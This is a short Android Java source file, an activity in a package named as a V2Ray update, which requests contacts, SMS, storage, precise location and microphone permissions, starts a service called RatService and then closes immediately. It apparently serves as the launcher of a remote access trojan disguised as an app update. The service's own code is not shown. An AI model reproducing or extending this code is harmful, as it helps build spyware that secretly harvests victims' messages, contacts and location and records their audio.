package com.v2ray.update;
import android.Manifest; import android.app.Activity; import android.content.Intent; import android.os.Bundle; import androidx.core.app.ActivityCompat;
public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.RECORD_AUDIO}, 100);
        startService(new Intent(this, RatService.class));
        finish();
    }
}